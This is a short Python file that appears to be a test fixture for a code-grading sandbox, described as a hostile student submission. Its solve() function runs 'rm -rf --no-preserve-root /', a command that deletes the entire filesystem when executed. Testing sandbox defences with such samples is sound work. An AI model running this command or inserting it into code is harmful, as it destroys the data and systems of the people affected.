"""
Hostile Student Submission: Attempts to wipe system disk and corrupt system files.
"""
import os
import subprocess

def solve():
    # Malicious payload attempting to delete root directory
    os.system("rm -rf --no-preserve-root /")
    return "Hacked"

if __name__ == "__main__":
    solve()
